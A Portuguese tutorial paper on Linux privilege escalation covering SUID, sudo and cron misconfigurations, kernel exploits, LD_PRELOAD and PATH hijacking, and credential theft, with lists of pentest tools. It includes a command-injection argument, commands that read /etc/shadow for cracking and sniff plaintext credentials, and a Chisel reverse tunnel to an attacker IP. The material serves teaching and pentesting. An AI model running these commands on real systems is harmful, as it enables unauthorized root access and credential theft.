---
title: "Privilege Escalation no Linux"
author: "slayer"
---


Olá, eu sou o Slayer. Neste paper, irei falar sobre a escalada de privilégios no Linux. Recomendo que, enquanto lê este paper, também vá testando as técnicas na prática, pois isso ajudará a entender melhor os conceitos e a aplicar os conhecimentos adquiridos de forma mais eficaz.

# Introdução

Escalação de privilégios é o processo de obter níveis mais altos de acesso ou controle em um sistema do que o originalmente permitido. Em sistemas Linux, isso geralmente envolve a elevação de um usuário comum para privilégios de root ou a exploração de permissões mal configuradas para acessar recursos restritos. Essa técnica é amplamente utilizada em ataques para comprometer sistemas e estender o alcance de uma invasão.

Escalar privilégios pode ocorrer de diferentes formas, seja para obter maior controle dentro do mesmo nível de acesso ou para atingir níveis mais altos de privilégio, como o root. No próximo tópico, vamos detalhar as diferenças entre a escalação horizontal e vertical.

## Escalação Horizontal X Escalação Vertical

A escalação horizontal ocorre quando um atacante ganha acesso às contas ou permissões de outro usuário no mesmo nível de privilégio, como um colega de trabalho em uma rede corporativa. Já a escalação vertical envolve a obtenção de permissões mais altas, como a de um administrador ou root, permitindo controle total sobre o sistema. Ambos os métodos podem ser usados em conjunto para explorar diferentes camadas de um ambiente.

## Conceitos Fundamentais

Feita a introdução, antes de começar a escalar privilégios, é óbvio que você deve conhecer pelo menos os conceitos básicos e fundamentais do Linux, como o funcionamento de permissões de arquivos, grupos e usuários, estrutura de pastas, configuração do sistema, etc. Se você não tem esse conhecimento básico sobre Linux, não perca o seu tempo lendo este paper.

# PrivEsc Techniques (misconfigs)

### SUID Files

Arquivos com a permissão SUID (Set User ID) permitem que o processo gerado pelo arquivo seja executado com as permissões do proprietário, não do usuário que o executa. Isso pode ser uma grande vulnerabilidade se arquivos SUID forem mal configurados, pois qualquer usuário comum pode obter privilégios elevados ao executar esses arquivos. Um exemplo clássico seria um arquivo SUID pertencente ao root que, se mal configurado ou com vulnerabilidades, poderia ser explorado por um atacante para obter acesso de root. Comandos como "find" podem ser usadas para localizar arquivos SUID em um sistema e verificar se há arquivos vulneráveis.

```bash
find / -perm /4000 2>/dev/null
```

Este comando por exemplo, busca a partir do diretório raiz arquivos com a permissão SUID ativada.

### Sudo With Misconfig

O arquivo de configuração do sudo define quem pode executar comandos como root e quais comandos podem ser executados. Uma configuração incorreta pode permitir que um usuário execute comandos com privilégios elevados sem autenticação adequada. Para verificar a configuração de sudo, use:

```bash
sudo cat /etc/sudoers
```

Se o arquivo sudoers permitir a execução de comandos como root sem senha, ou se um usuário comum tiver permissões excessivas, isso pode ser explorado para escalar privilégios! (Obs: Lembrando que o arquivo "/etc/sudoers" por padrão só pode ser modificado e lido pelo root!)

### Crontabs With Misconfig

Crontabs são usados para agendar tarefas automáticas. Se um crontab for mal configurado, com permissões excessivas, um atacante pode modificar o cron job para executar comandos arbitrários com privilégios elevados. Para verificar crontabs, execute:

```bash
crontab -l
```

Além disso, a verificação de crontabs do sistema pode ser feita inspecionando os arquivos em /etc/cron.d/ e /var/spool/cron/crontabs!

# PrivEsc Techniques (Vulnerabilities)

### Kernel exploits

Vulnerabilidades no kernel Linux permitem que atacantes elevem privilégios explorando falhas na lógica de sistemas críticos. Duas das mais famosas são:

[Dirty COW (CVE-2016-5195)](https://dirtycow.ninja/): Essa vulnerabilidade ocorre devido a uma condição de corrida na implementação de cópia sob gravação (Copy-On-Write) no kernel Linux. Isso permite que um atacante com acesso de gravação a um arquivo, mesmo que protegido, modifique seu conteúdo. Por exemplo, um arquivo de configuração crítico como /etc/passwd pode ser alterado para adicionar um usuário root.

[Dirty Pipe (CVE-2022-0847)](https://www.hackthebox.com/blog/Dirty-Pipe-Explained-CVE-2022-0847): Similar ao Dirty COW, mas específico a sistemas com kernels mais recentes. Ele explora falhas na manipulação de buffers em pipelines do Linux. Um atacante pode injetar dados em arquivos de leitura somente, como os logs do sistema, para executar comandos maliciosos. O processo de exploração envolve a manipulação de dados no nível do buffer de leitura.

Ambas as vulnerabilidades requerem um exploit específico, que pode ser encontrado em bases como o [Exploit-DB](https://www.exploit-db.com/).

### Root Services

Serviços rodando como root representam um dos maiores riscos de segurança em sistemas Linux, pois qualquer vulnerabilidade nesses serviços pode ser explorada para obter privilégios elevados. O fato de um serviço rodar com privilégios de root significa que ele tem acesso irrestrito ao sistema, podendo modificar arquivos críticos, executar comandos privilegiados e, em muitos casos, comprometer a integridade do sistema inteiro. Por isso, é fundamental que apenas os serviços realmente necessários para o funcionamento do sistema sejam executados com esses privilégios, e que eles sejam configurados corretamente.

Muitos serviços, especialmente servidores web, bancos de dados e servidores de arquivos, frequentemente rodam como root para realizar operações específicas que exigem acesso a recursos restritos. Um exemplo clássico é o servidor web nginx ou apache, que pode precisar acessar diretórios ou arquivos com permissões restritas, como logs ou arquivos de configuração do sistema. Se um desses serviços for mal configurado, um atacante pode explorar falhas para injetar código malicioso, obter acesso ao sistema ou até mesmo escalar privilégios.

Uma das formas mais comuns de exploração de serviços que rodam como root é a RCE. Isso ocorre quando um atacante consegue fazer com que o serviço execute comandos arbitrários no sistema, geralmente aproveitando vulnerabilidades como buffer overflows, falhas de validação de entrada ou autenticação inadequada. Um atacante pode, por exemplo, enviar uma solicitação maliciosa para um servidor web que permita a execução de um script arbitrário. Se esse servidor estiver rodando como root, o atacante pode ganhar controle total sobre o sistema, podendo criar backdoors para acessos futuros. Para identificar quais processos estão rodando como root, você pode executar:

```bash
ps aux | grep root
```

### Dynamic Libraries

A exploração de bibliotecas dinâmicas é uma técnica usada para alterar o comportamento de programas legítimos, fazendo com que eles carreguem e executem código malicioso. Essa técnica se baseia no funcionamento do sistema Linux, que permite que programas carreguem bibliotecas externas durante sua execução. As variáveis de ambiente LD_PRELOAD e LD_LIBRARY_PATH são essenciais nesse processo, pois controlam a ordem em que as bibliotecas são carregadas.

A técnica mais comum de exploração envolve a variável LD_PRELOAD. Quando um programa é executado com essa variável configurada, o sistema carrega uma biblioteca especificada antes de qualquer outra biblioteca do sistema. Isso significa que, ao manipular essa variável, é possível fazer com que o programa execute funções de uma biblioteca diferente da original. Por exemplo, pode-se substituir funções como system(), execve() ou setuid() para modificar o comportamento do programa, permitindo que ações indesejadas sejam realizadas, como a execução de comandos com privilégios elevados.

Esse tipo de exploração acontece quando um programa, especialmente aqueles que possuem permissões elevadas, não valida adequadamente as variáveis de ambiente. Isso permite que, ao manipular a variável LD_PRELOAD, uma biblioteca maliciosa seja carregada antes do programa original. A partir daí, a biblioteca pode sobrescrever funções importantes do programa, permitindo, por exemplo, a execução de comandos no sistema sem que o programa legítimo perceba.

Como exemplo, imagine que um programa use a função system() para executar comandos. Se ele não limpar as variáveis de ambiente antes de fazer isso, você pode criar uma biblioteca maliciosa que modifica a execução dessa função, fazendo com que comandos sejam executados com privilégios de root. Isso pode ser feito criando uma biblioteca que substitui a função setuid() para alterar o ID de usuário do programa e conceder acesso total ao sistema.

Outra forma de exploração acontece com a variável LD_LIBRARY_PATH, que especifica os diretórios onde o sistema procura por bibliotecas. Se um programa confiar nesse caminho de busca de maneira insegura, é possível manipular a variável para apontar para uma versão maliciosa de uma biblioteca. Isso faz com que o programa utilize uma versão comprometida da biblioteca, que pode executar ações prejudiciais ao sistema.

Além disso, existe a possibilidade de library hijacking, onde uma versão maliciosa de uma biblioteca é colocada em um diretório onde o sistema espera encontrar bibliotecas. Se o programa procurar por uma biblioteca nesse diretório, acabará usando a versão modificada, o que permite que o código malicioso seja executado.

Hoje em dia, algumas medidas de segurança podem dificultar esses ataques, como a configuração do ld.so para bloquear a manipulação de LD_PRELOAD em programas com permissões elevadas ou o uso de recursos como o ASLR, que torna mais difícil para um invasor prever onde as bibliotecas serão carregadas na memória. No entanto, se não forem tomadas as precauções corretas, a exploração de bibliotecas dinâmicas ainda pode ser uma técnica eficaz para obter acesso root a sistemas.

### Command Injection

O command injection ocorre quando um script, que é executado com privilégios como root, não valida adequadamente as entradas fornecidas, permitindo que comandos maliciosos sejam inseridos e executados. Isso pode acontecer em scripts de automação, como backups ou limpeza de arquivos, que aceitam entradas de usuários sem a devida verificação.

Por exemplo, um script de backup que recebe um diretório como argumento pode ser manipulado para executar um comando malicioso, como:

```bash
./backup.sh "/home/user; id"
```

A principal causa dessa vulnerabilidade é o uso de funções como eval ou system, que executam comandos diretamente, sem validar as entradas.

### Path Hijacking

O Path Hijacking ocorre quando um invasor manipula o caminho de busca de executáveis no sistema (usando a variável de ambiente PATH) para forçar o sistema a executar um arquivo malicioso em vez de um executável legítimo. Isso pode ser feito adicionando diretórios controlados pelo atacante ao início da variável PATH, fazendo com que os programas procurem e executem versões comprometidas de binários ou scripts.

Por exemplo, se o atacante conseguir alterar a variável PATH para incluir um diretório onde um binário malicioso foi colocado, o sistema pode acabar executando esse binário ao invés do original. Suponha que um script ou comando tente rodar um programa como ls ou cat. Se o diretório contendo um binário malicioso de ls ou cat for listado antes do diretório padrão, o sistema irá executar o binário malicioso, que pode conter código para obter privilégios elevados ou executar comandos maliciosos.

```bash
export PATH=/path/malicious:$PATH
```

Isso pode permitir que o atacante execute comandos sem que o sistema execute as versões legítimas desses programas.

# PrivEsc Techniques (Credentials/Tokens)

### Theft Of Hashes/Passwords

O roubo de hashes e senhas ocorre quando um atacante consegue acessar e extrair os hashes de senhas armazenados em arquivos como o /etc/shadow no Linux. O arquivo /etc/shadow armazena as senhas criptografadas (em forma de hashes) dos usuários do sistema. Se um atacante conseguir acessar esse arquivo, ele pode tentar quebrar os hashes e obter as senhas originais.

Normalmente, as senhas no Linux são armazenadas de forma criptografada, utilizando algoritmos como MD5, SHA-512 ou bcrypt. Porém, esses algoritmos de hash não são reversíveis, ou seja, não é possível recuperar diretamente a senha original a partir do hash. No entanto, com a extração do hash, um atacante pode usar técnicas como brute force ou rainbow tables para tentar adivinhar a senha original.

Por exemplo, se o atacante conseguir ler o arquivo /etc/shadow, que contém as senhas dos usuários, ele pode usar ferramentas como o João o Estuprador (John the Ripper) ou Hashcat para tentar quebrar os hashes e obter as senhas. O comando abaixo pode ser usado para extrair as senhas de um arquivo /etc/shadow:

```bash
sudo cat /etc/shadow | grep user
```

Isso revela o hash da senha do usuário especificado. A partir daí, o atacante pode tentar adivinhar a senha através de ataques de força bruta ou usando tabelas pré computadas! (Obs: Novamente dizendo o obvio, o /etc/shadow normalmente só pode ser acessado pelo root.)

### Keyloggers & Sniffers

Keyloggers e sniffers são ferramentas usadas para capturar credenciais, explorando diferentes pontos do sistema. Enquanto keyloggers monitoram e registram tudo o que é digitado pelo teclado, sniffers interceptam e analisam o tráfego de rede para extrair informações sensíveis, como nomes de usuários e senhas.

Keyloggers podem ser implementados como software ou hardware. No caso de software, eles se integram ao S.O para registrar entradas do teclado. Um keylogger pode ser instalado em um sistema comprometido por meio de malwares, engenharia social ou acesso físico. Uma vez ativo, ele registra tudo o que o usuário digita, incluindo credenciais usadas para login, acessos a serviços bancários e outros dados sensíveis.

Por exemplo, um keylogger simples pode ser implementado como um LKM que intercepta chamadas de sistema relacionadas ao teclado. Isso pode ser feito no Linux manipulando dispositivos como /dev/input/ para capturar as teclas pressionadas. O log gerado pelo keylogger pode ser armazenado localmente ou enviado para um servidor remoto.

Já sniffers trabalham interceptando pacotes de dados que trafegam pela rede. Eles são especialmente eficazes em redes não criptografadas, onde as informações sensíveis, como credenciais, podem ser capturadas em texto puro. Ferramentas como Tubarão de Fio (Wireshark) ou tcpdump são usadas para capturar e analisar pacotes. Por exemplo, em uma rede desprotegida, um invasor pode usar um comando como:

```bash
tcpdump -i eth0 -A port 80
```

Esse comando captura tráfego HTTP (não criptografado) na interface de rede eth0, onde credenciais enviadas em formulários podem ser interceptadas.

# Automatic Tools

## [LinPEAS](https://github.com/peass-ng/PEASS-ng)

O LinPEAS (Linux Privilege Escalation Awesome Script) é uma ferramenta de auditoria que automatiza a busca por vetores de escalação de privilégios em sistemas Linux. Ele analisa o sistema em busca de vulnerabilidades, como configurações inseguras, arquivos SUID, permissões incorretas, serviços mal configurados e muito mais. O LinPEAS é amplamente utilizado por sua abordagem detalhada e abrangente.

## [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)

O Linux Exploit Suggester é uma ferramenta que identifica possíveis vulnerabilidades do kernel Linux no sistema alvo. Baseando-se na versão do kernel, ele sugere exploits conhecidos que podem ser usados para obter privilégios elevados. É especialmente útil para determinar exploits específicos que podem ser aplicados ao sistema.

## [GTFOBins](https://gtfobins.github.io/)

O GTFOBins é uma coleção de binários Unix que podem ser explorados para escalar privilégios, executar comandos, ou escapar de ambientes restritos, como chroot ou containers. A plataforma oferece uma base de dados online e permite buscar por binários específicos e os métodos de exploração associados. É uma ferramenta indispensável para pentesters e pesquisadores de segurança.

# Useful Tools

## Strace

O strace é uma ferramenta que permite rastrear syscalls feitas por um processo em execução. Ele é amplamente utilizado para depuração e análise de comportamento de programas. Ao observar as syscalls, é possível identificar interações com arquivos, redes, ou até vulnerabilidades em binários mal projetados.

```bash
strace -o output.txt ./programa
```

## Ltrace

O ltrace é semelhante ao strace, mas foca no rastreamento de chamadas a bibliotecas dinâmicas (como libc). Ele é útil para observar interações com funções como printf, malloc, ou chamadas específicas a bibliotecas externas, que podem revelar vulnerabilidades ou comportamentos inesperados.

```bash
ltrace ./programa
```

## Gdb

O gdb (GNU Debugger) é uma ferramenta poderosa para depuração de programas. Ele permite analisar a execução de um binário em tempo real, inspecionar a memória, modificar registradores, ou até mesmo explorar vulnerabilidades como buffer overflows.

```bash
gdb ./programa
```

Com isso, você entra no ambiente interativo do gdb, onde pode definir breakpoints, analisar o fluxo do programa e explorar vulnerabilidades.

# Task automation

## [LinEum](https://github.com/rebootuser/LinEnum)

O LinEnum é um script que automatiza a coleta de informações de sistemas Linux para identificar possíveis vetores de escalação de privilégios. Ele verifica permissões, arquivos sensíveis, binários SUID, crontabs e muito mais, economizando tempo em auditorias manuais.

## [PSPY](https://github.com/DominicBreuker/pspy)

O pspy é uma ferramenta leve que monitora processos em execução no sistema sem precisar de permissões elevadas. Ele é útil para identificar scripts, tarefas cron ou serviços sendo executados que podem ser explorados.

## [Chisel](https://github.com/jpillora/chisel)

O Chisel é uma ferramenta de tunelamento reverso e redirecionamento de portas. Ele é útil para estabelecer conexões entre máquinas comprometidas e o atacante, especialmente em ambientes onde o acesso à rede é restrito.

Exemplo de uso:

*No atacante (modo servidor):*

```bash
chisel server -p 8000 --reverse
```

*Na máquina comprometida (modo cliente):*

```bash
chisel client ip-do-atacante:8000 R:8000:localhost:22
```

Esse comando redireciona a porta 22 (normalmente a SSH) da máquina comprometida para o atacante!
